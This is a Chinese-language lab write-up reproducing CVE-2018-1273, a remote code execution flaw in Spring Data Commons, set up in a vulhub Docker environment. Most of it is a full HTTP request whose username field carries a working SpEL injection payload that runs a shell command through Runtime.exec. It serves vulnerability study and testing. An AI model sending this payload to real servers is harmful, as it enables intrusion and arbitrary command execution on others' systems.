# Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）

[toc]

## 环境搭建

docker-compose.yml

```yml
version: '2'
services:
 spring:
   image: vulhub/spring-data-commons:2.0.5
   ports:
    - "8080:8080"
```

```bash
docker-compose up -d
```

## 漏洞复现

* 访问`http://your-ip:8080/users`

* 抓取报文并修改

    ```http
    POST /users?page=&size=5 HTTP/1.1
    Host: 127.0.0.1:8080
    Content-Length: 126
    Cache-Control: max-age=0
    sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96"
    sec-ch-ua-mobile: ?0
    sec-ch-ua-platform: "Windows"
    Upgrade-Insecure-Requests: 1
    Origin: http://127.0.0.1:8080
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: http://127.0.0.1:8080/users
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    
    username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/Mysuccess")]=&password=&repeatedPassword=
    ```

## 漏洞分析

> [Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2269#toc-3)